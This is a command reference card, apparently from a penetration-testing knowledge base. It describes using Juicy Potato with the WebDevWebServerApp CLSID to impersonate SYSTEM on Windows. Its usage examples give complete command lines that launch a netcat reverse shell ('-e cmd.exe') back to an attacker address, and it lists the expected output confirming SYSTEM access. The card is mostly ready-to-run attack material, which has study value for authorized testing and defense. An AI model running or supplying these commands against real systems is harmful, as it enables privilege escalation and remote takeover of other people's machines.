---
type: command
executor: cmd
data: >-
  JuicyPotato.exe -l 9999 -p $_PROCESS_PATH -a "$_ARGUMENTS" -t $_TOKEN_TYPE -c
  {B91D5831-B1BD-4608-8198-D72E155020F7}
tags:
  - privilege-escalation
  - reverse-shell
  - windows
platforms:
  - Windows
verified: true
validated: true
---

# juicy-potato-nc-reverse-shell-clsid-b91d5831

## Command

```cmd
JuicyPotato.exe -l 9999 -p $_PROCESS_PATH -a "$_ARGUMENTS" -t $_TOKEN_TYPE -c {B91D5831-B1BD-4608-8198-D72E155020F7}
```

## Description

Executes Juicy Potato using CLSID {B91D5831-...} to impersonate SYSTEM and spawn a netcat reverse shell. The local port 9999 is used for the impersonation pipe.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -l 9999 | Local port for impersonation pipe | Yes |
| -p $_PROCESS_PATH | Path to executable (e.g., nc.exe) | Yes |
| -a "$_ARGUMENTS" | Arguments (e.g., "ATTACKER_IP ATTACKER_PORT -e cmd.exe") | Yes |
| -t $_TOKEN_TYPE | Token type (* for default, t for primary) | Yes |
| -c {B91D5831-...} | CLSID for DCOM object (WebDevWebServerApp) | Yes |

## Examples

### Basic Usage

```cmd
JuicyPotato.exe -l 9999 -p c:\inetpub\wwwroot\upload\nc.exe -a "192.168.1.100 4444 -e cmd.exe" -t t -c {B91D5831-B1BD-4608-8198-D72E155020F7}
```

### Advanced Usage

With error handling or logging:

```cmd
JuicyPotato.exe -l 9999 -p nc.exe -a "ATTACKER_IP PORT -e cmd.exe" -t t -c {B91D5831-B1BD-4608-8198-D72E155020F7} > output.txt 2>&1
```

## Expected Output

Testing {B91D5831-...} 9999
...
[+] authresult 0
{B91D5831-...};NT AUTHORITY\SYSTEM
[+] CreateProcessWithTokenW OK

A reverse shell connects to the listener as SYSTEM.

## Related

- [[procedures/Abusing-Golden-Privileges-with-Juicy-Potato]]
- [[tools/Juicy-Potato]]
